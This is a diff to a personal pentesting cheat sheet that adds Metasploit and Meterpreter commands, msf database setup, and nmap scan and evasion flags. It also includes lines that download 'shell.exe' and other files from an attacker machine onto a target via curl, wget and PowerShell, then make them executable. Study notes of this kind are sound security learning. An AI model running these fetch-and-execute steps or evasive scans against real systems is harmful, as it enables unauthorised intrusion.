@@ -17,6 +17,10 @@
   - [DNS, SMB, SNMP](#dns-smb-snmp)
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
+- [METASPLOIT](#metasploit)
+  - [Meterpreter](#meterpreter)
+  - [Metasploit with database](#metasploit-with-database)
+    - [NMAP - DB_NMAP](#nmap---db_nmap)
 
 
 # Linux
@@ -179,7 +183,9 @@
 - Option 1 - starting local server
   1. python3 -m http.server 8000
   2. wget attacker-machine:8000:file.ext
-  3. make executable: chmod +x file.ext
+  3. curl attacker-machine:8000:file.ext
+  4. [Powershell] powershell **Invoke-WebRequest -Uri** http://10.9.1.255:80/shell.exe **-Outfile** file.exe
+  5. make executable: chmod +x file.ext
 
 - Option 2 - copy source
   1. Copy code from source and past in the target + save .sh
@@ -209,3 +215,66 @@
 # Code Analyse
 - snyk --scan-all-unmanaged
   - unpack zip file
+
+# METASPLOIT
+- msfconsole
+- use exploit/multi/handler
+- search [keyword]
+- show options
+- setg => set global valules
+- unsetg => unset global values
+- background => putting a session in backgrou
+- sessions => display sessions
+
+## Meterpreter
+- sysinfo
+- getpid
+
+## Metasploit with database
+
+- Basic usage
+  - use handler/multi
+  - set payload
+
+1. service postgresql start
+2. service metasploit start
+3. update-rc.d postgresql enable *for performance*
+4. update-rc.d metasploit enable *for performance*
+5. db_rebuild_cache [in msf console] *for performance*
+
+- db_command ==> db_status, db_nmap etc
+
+- workspace -a (add)
+- workspace -d (delete)
+- workspace name (move to name)
+
+### NMAP - DB_NMAP
+- db_nmap 
+  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
+    - https://www.exploit-db.com/
+    - https://nvd.nist.gov/vuln/full-listing
+  - -sC: other common scripts
+  - -sS (Syn), -sA(Ack)
+  - -A: basic scan with OS include
+    - -sV -O -sC [default scripts] --traceroute
+  - -p-: all ports
+  - -sV: version of services found
+  - -Pn: no ping
+  - -T[0-5] = Control speed
+  - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
+  - --spoof-mac [MAC]
+  - -f[-f] => fragment
+  - --reason / -v / -vv / -d / -dd
+
+- Output
+  - -oN = normal output
+  - -oG = grep output
+
+- hosts: list hosts from db
+  - -a: add
+  - -d: delete
+  - -R: inside a exploit/scanner to add the scanned host as RHOST
+
+- services: display services found in scans
+ - From services google for vulnerabilities /also search in metasploit
+ - Common services: http, ftp, smb, ssh, rdp
